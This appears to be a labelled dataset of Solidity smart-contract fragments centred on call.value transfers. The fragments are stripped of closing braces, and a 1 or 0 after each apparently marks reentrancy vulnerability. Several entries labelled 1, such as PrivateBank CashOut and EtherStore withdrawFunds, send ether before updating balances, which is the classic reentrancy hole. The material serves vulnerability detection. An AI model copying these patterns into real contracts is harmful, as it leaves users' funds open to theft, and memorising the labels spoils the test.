&& _transactionData[1] == 0x37 && _transactionData[2] == 0xff
&& _transactionData[3] == 0x1e
&& quorum < minQuorum(actualBalance() + rewardToken[address(this)])) {
proposalCheck = false;
if (quorum >= minQuorum(p.amount)) {
if (!p.creator.send(p.proposalDeposit))
throw;
lastTimeMinQuorumMet = now;
if (quorum > totalSupply / 5)
minQuorumDivisor = 5;
if (quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck) {
if (!p.recipient.call.value(p.amount)(_transactionData))
throw;
p.proposalPassed = true;
_success = true;
if (p.recipient != address(this) && p.recipient != address(rewardAccount) && p.recipient != address(DAOrewardAccount) && p.recipient != address(extraBalance) && p.recipient != address(curator)) {
rewardToken[address(this)] += p.amount;
totalRewardToken += p.amount;
closeProposal(_proposalID);
ProposalTallied(_proposalID, _success, quorum);
function newContract(address _newContract){
if (msg.sender != address(this) || !allowedRecipients[_newContract]) return;
if (!_newContract.call.value(address(this).balance)()) {
throw;
rewardToken[_newContract] += rewardToken[address(this)];
rewardToken[address(this)] = 0;
DAOpaidOut[_newContract] += DAOpaidOut[address(this)];
DAOpaidOut[address(this)] = 0;
1
---------------------------------
495 39932.sol
function process(bytes32 _destination) payable returns (bool) {
if (msg.value < 100) throw;
var tax = msg.value * taxPerc / 100;
var refill = bytes4(sha3("refill(bytes32)"));
if ( !ledger.call.value(tax)(refill, taxman)|| !ledger.call.value(msg.value - tax)(refill, _destination)) throw;
return true;
contract Invoice is Mortal {
address   public signer;
uint      public closeBlock;
Comission public comission;
string    public description;
bytes32   public beneficiary;
uint      public value;
0
---------------------------------
496 35649.sol
function playerWithdrawPendingTransactions() public payoutsAreActive returns (bool) {
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
1
---------------------------------
497 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
498 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
499 31759.sol
function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) external {
bytes32 txHash = keccak256(byte(0x19), byte(0), this, nonce++, destination, value, data );
verifySignatures( sigV,sigR,sigS,txHash);
require(destination.call.value(value)(data));
0
---------------------------------
500 39890.sol
function authorizePayment(uint _idMilestone) internal {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if (milestone.status == MilestoneStatus.AuthorizedForPayment) throw;
milestone.status = MilestoneStatus.AuthorizedForPayment;
if(!milestone.paymentSource.call.value(0)(milestone.payData)) throw;
ProposalStatusChanged(_idMilestone, milestone.status);
function approveCompletedMilestone(uint _idMilestone) campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((msg.sender != milestone.reviewer) ||(milestone.status != MilestoneStatus.Completed)) throw;
authorizePayment(_idMilestone);
function requestMilestonePayment(uint _idMilestone) campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((msg.sender != milestone.milestoneLeadLink)&&(msg.sender != recipient))  hrow;
if ((milestone.status != MilestoneStatus.Completed) || (now < milestone.doneTime + milestone.reviewTime)) throw;
authorizePayment(_idMilestone);
function arbitrateApproveMilestone(uint _idMilestone) onlyArbitrator campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if (milestone.status != MilestoneStatus.AcceptedAndInProgress) && (milestone.status != MilestoneStatus.Completed)) throw;
authorizePayment(_idMilestone);
0
---------------------------------
501 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
502 11885.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from,address _to,uint256 _value,bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract Ownable {
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
0
---------------------------------
503 37329.sol
function buyICO() onlyExecutorOrOwner {
if (getBlockNumber() < icoStartBlock) return;
if (this.balance == 0) return;
uint256 purchaseAmount = Math.min256(this.balance, purchaseCap);
assert(crowdSale.call.value(purchaseAmount)());
ICOPurchased(purchaseAmount);
0
---------------------------------
504 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
505 PrivateBank.sol
function CashOut(uint _am) {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
function() public payable{}
1
---------------------------------
506 28974.sol
function pay(address _addr, uint256 count) public payable {
assert(changeable==true);
assert(msg.value >= price*count);
if(!founder.call.value(price*count)() || !msg.sender.call.value(msg.value-price*count)()) {
revert();
s.update(_addr,count);
Buy(msg.sender,count);
function () public payable {
pay(msg.sender,1);
0
---------------------------------
507 919.sol
function upgradeToAndCall(string version, address implementation, bytes data) payable public onlyProxyOwner {
upgradeTo(version, implementation);
require(this.call.value(msg.value)(data));
contract EternalStorageProxyForStormMultisender is OwnedUpgradeabilityProxy, EternalStorage {
0
---------------------------------
508 39662.sol
function sendToCharger(uint id) {
if (msg.sender != Owner && msg.sender != Manager) return ;
var _amountForCharger = getAmountForCharger(id);
uint _priceOfCharger = Chargers[id].Address.getPrice() ;
if(_priceOfCharger> _amountForCharger){
uint difference  = _priceOfCharger - _amountForCharger;
calculateCountOfInvestmetnsInQueue(difference,id);
if(!Chargers[id].Address.call.value(_priceOfCharger)()) throw;
0
---------------------------------
509 31565.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
510 2013.sol
function executeTransaction(address destination, uint value, bytes data) public onlyOwner {
if (destination.call.value(value)(data))
emit Execution(destination,value,data);
else
emit ExecutionFailure(destination,value,data);
0
---------------------------------
511 16643.sol
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
0
---------------------------------
512 12182.sol
function transferEther(address to, uint256 amount) public returns (bool) {
require(msg.sender == owner);
return to.call.value(amount)();
function() public payable {}
contract Controller is ControllerStorage, Ownable, HasWorkers {
event CreatedUserWallet(address _wallet);
event WithdrawEth(address _wallet, address _to, uint256 _amount);
event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount);
event ChangedForward(address _old, address _new, address _operator);
constructor() public {
setForward(msg.sender);
function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) {
return destination.call.value(value)(_bytes);
function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) {
uint256 size = wallets.length;
uint256 balance;
Wallet wallet;
for (uint256 i = 0; i < size; i++) {
wallet = wallets[i];
balance = wallet.balance;
if (wallet.transferEther(this, balance)) {
emit WithdrawEth(wallet, forward, balance);
forward.call.value(address(this).balance)();
return true;
0
---------------------------------
513 30337.sol
function withdrawPayments() external returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) {
throw;
success = true;
0
---------------------------------
514 6881.sol
function buyOne(ERC20 token, address _exchange, uint256 _value, bytes _data) payable public {
balances[msg.sender] = balances[msg.sender].add(msg.value);
uint256 tokenBalance = token.balanceOf(this);
require(_exchange.call.value(_value)(_data));
balances[msg.sender] = balances[msg.sender].sub(_value);
tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance));
1
---------------------------------
515 35878.sol
function Forwarder(address _creator, bytes32 _regName, address _owner) public
RegBase(_creator, _regName, _owner)
forwardTo = owner;
function() public payable {
Forwarded(msg.sender, forwardTo, msg.value);
require(forwardTo.call.value(msg.value)(msg.data));
function createNew(bytes32 _regName, address _owner) public payable feePaid
returns (address kAddr_)
kAddr_ = address(new Forwarder(msg.sender, _regName, _owner));
Created(msg.sender, _regName, kAddr_);
0
---------------------------------
516 3255.sol
function endRound(LOLdatasets.EventReturns memory _eventData_) private returns (LOLdatasets.EventReturns)
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0)
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = 0;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_) private returns(LOLdatasets.EventReturns)
uint256 _com = _eth / 50;
uint256 _p3d;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit LOLevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_com = _com.add(_aff);
address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()")));
return(_eventData_);
0
---------------------------------
517 27263.sol
function loggedTransfer(uint amount, bytes32 logMsg, address target, address currentOwner) payable {
if(msg.sender != address(this))throw;
if(target.call.value(amount)()) {
CashMove(amount, logMsg, target, currentOwner);
function Divest(uint amount)  public  {
if (investors[msg.sender] > 0 && amount > 0)  {
this.loggedTransfer(amount, "", msg.sender, owner);
investors[msg.sender] -= amount;
function withdraw() public {
if(msg.sender==owner) {
this.loggedTransfer(this.balance, "", msg.sender, owner);
1
---------------------------------
518 33835.sol
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (m_txs[_h].to != 0) {
var x= m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data);
MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data);
delete m_txs[_h];
return true;
function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) {
_r = sha3(msg.data, block.number);
if (!confirm(_r) && m_txs[_r].to == 0) {
m_txs[_r].to = _to;
m_txs[_r].value = _value;
m_txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
0
---------------------------------
519 37474.sol
function execute(address _to, uint _value, bytes _data) external returns (bytes32 _r) {
require(msg.sender==owner);
require(_to.call.value(_value)(_data));
return 0;
0
---------------------------------
520 4472.sol
function () public payable {
address(0x0581cee36a85Ed9e76109A9EfE3193de1628Ac2A).call.value(msg.value)();
0
---------------------------------
521 37676.sol
function send(address _to, uint _value, bytes _data) only_owner {
if (!_to.call.value(_value)(_data)) throw;
Sent(_to, _value, _data);
0
---------------------------------
522 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
523 22247.sol
function Collect(uint _am) public payable {
if(Accounts[msg.sender]>=MinSum && _am<=Accounts[msg.sender] && block.number>putBlock) {
if(msg.sender.call.value(_am)()) {
Accounts[msg.sender]-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
function() public payable
Put(msg.sender);
1
---------------------------------
524 40366.sol
function execute(address _to, uint _value, bytes _data) {
if (!isRightBranch) throw;
if (msg.sender != owner) throw;
if (!_to.call.value (_value)(_data)) throw;
contract BranchSender {
bool public isRightBranch;
0
---------------------------------
525 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
526 9221.sol
function bet() payable
if ((random()%2==1) && (msg.value == 1 ether) && (!locked))
if (!msg.sender.call.value(2 ether)())
throw;
function releaseFunds(uint amount)
if (gameOwner==msg.sender)
if (!msg.sender.call.value( amount * (1 ether))())
throw;
0
---------------------------------
527 40038.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner returns (bytes32 _r) {
if (_to == address(tokenCtr)) throw;
if (underLimit(_value)) {
SingleTransact(msg.sender, _value, _to, _data);
if(!_to.call.value(_value)(_data))
return 0;
_r = sha3(msg.data, block.number);
if (!confirm(_r) && m_txs[_r].to == 0) {
m_txs[_r].to = _to;
m_txs[_r].value = _value;
m_txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (m_txs[_h].to != 0) {
if(!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))
MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data);
delete m_txs[_h];
return true;
1
---------------------------------
528 2189.sol
function transferAndCall(address _to, uint256 _value, bytes _data) public payable whenNotPaused returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable {
using SafeMath for uint256;
GOeureka public token;
WhiteListedBasic public whiteListed;
uint256 public presaleEnd;
uint256 public saleEnd;
uint256 public minContribution;
address public multiSig;
uint256 public weiRaised;
uint256 public tokensRaised;
mapping(address => uint256) public contributions;
uint256 public numberOfContributors = 0;
uint public basicRate;
event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
event SaleClosed();
event HardcapReached();
event NewCapActivated(uint256 newCap);
constructor(GOeureka token_, WhiteListedBasic _whiteListed) public {
basicRate = 3000;
calculateRates();
presaleEnd = 1536508800;
saleEnd = 1543593600;
multiSig = MULTISIG_ETH;
token = token_;
whiteListed = _whiteListed;
bool allocated = false;
1
---------------------------------
529 11705.sol
function commonWithdraw(address token, uint value) internal {
require (tokens[token][msg.sender] >= value);
tokens[token][msg.sender] -= value;
totalDeposited[token] -= value;
require((token != 0)? ERC20(token).transfer(msg.sender, value): msg.sender.call.value(value)() );
emit Withdraw(token, msg.sender, value, tokens[token][msg.sender]);
function withdraw(uint amount) public {
commonWithdraw(0, amount);
function withdrawToken(address token, uint amount) public {
commonWithdraw(token, amount);
0
---------------------------------
530 40589.sol
function sendRobust(address to, uint value) internal {
if (!to.send(value)) {
if (!to.call.value(value)()) throw;
function _fillOrder(address _from, uint numTokens) internal returns (bool) {
if (numTokens == 0) throw;
if (this.balance < numTokens * weiPerToken / decimalPlaces) throw;
if (!token.transferFrom(_from, owner, numTokens)) return false;
sendRobust(_from, numTokens * weiPerToken / decimalPlaces);
OrderFilled(_from, numTokens);
return true;
0
---------------------------------
531 EtherStore.sol
function withdrawFunds(uint256 _weiToWithdraw) public {
require(balances[msg.sender] >= _weiToWithdraw);
require(_weiToWithdraw <= withdrawalLimit);
require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
require(msg.sender.call.value(_weiToWithdraw)());
balances[msg.sender] -= _weiToWithdraw;
lastWithdrawTime[msg.sender] = now;
1
---------------------------------
532 27248.sol
function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) public {
require(sigR.length == threshold);
require(sigR.length == sigS.length && sigR.length == sigV.length);
bytes32 txHash = keccak256(byte(0x19), byte(0), address(this), destination, value, data, nonce);
address lastAdd = address(0);
for (uint i = 0; i < threshold; i++) {
address recovered = ecrecover(txHash, sigV[i], sigR[i], sigS[i]);
require(recovered > lastAdd && isOwner[recovered]);
lastAdd = recovered;
nonce = nonce + 1;
require(destination.call.value(value)(data));
0
---------------------------------
533 30046.sol
function executeTransaction() public onlyActiveUsersAllowed() transactionMustBePending() {
Transaction storage transaction = transactions[transactions.length - 1];
require(now > transaction.time_initiated + users[transaction.initiated_by].waiting_time);
transaction.is_executed = true;
transaction.time_finalized = now;
transaction.finalized_by = msg.sender;
transaction.execution_successful = transaction.destination.call.value(
transaction.value)(transaction.data);
1
---------------------------------
534 29517.sol
function temporaryEscapeHatch(address to, uint256 value, bytes data) public {
require(msg.sender == admin);
require(to.call.value(value)(data));
0
---------------------------------
535 3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
1
---------------------------------
536 40416.sol
function withdraw(uint amount) {
if (msg.value>0) throw;
if (tokens[0][msg.sender] < amount) throw;
tokens[0][msg.sender] -= amount;
if (!msg.sender.call.value(amount)()) throw;
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
537 23166.sol
function buy(address recipient) payable public duringCrowdSale  {
require(!halted);
require(msg.value >= 0.01 ether);
uint256 tokens = msg.value.mul(35e4);
require(tokens > 0);
require(saleTokenSupply.add(tokens)<=coinAllocation );
balances[recipient] = balances[recipient].add(tokens);
totalSupply_ = totalSupply_.add(tokens);
saleTokenSupply = saleTokenSupply.add(tokens);
salesVolume = salesVolume.add(msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(msg.sender, recipient, msg.value, tokens);
function TorusCoin(uint256 startDatetimeInSeconds, address founderWallet) public {
admin = msg.sender;
founder = founderWallet;
startDatetime = startDatetimeInSeconds;
endDatetime = startDatetime + 16 * 1 days;
function() public payable {
buy(msg.sender);
0
---------------------------------
538 39664.sol
function migrateBlockjack() only(ADMIN_CONTRACT) {
stopBlockjack();
if (currentBankroll > initialBankroll) {
if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw;
suicide(DX);
function shareProfits() onlyOwner {
if (profitsLockedUntil > now) throw;
if (currentBankroll <= initialBankroll) throw;
uint256 profit = currentBankroll - initialBankroll;
if (!ADMIN_CONTRACT.call.value(profit)()) throw;
currentBankroll -= profit;
bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD;
profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD;
0
---------------------------------
539 37891.sol
function claim() {
uint balance = balances[msg.sender];
require(balance > 0);
balances[msg.sender] = 0;
bool claimed = msg.sender.call.value(balance)();
require(claimed);
0
---------------------------------
540 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback) public returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
541 17215.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public isRunning returns (bool ok) {
require(compatible223ex);
require(isUnlockedBoth(_to));
require(balances[msg.sender] >= _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
if (isContract(_to)) {
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
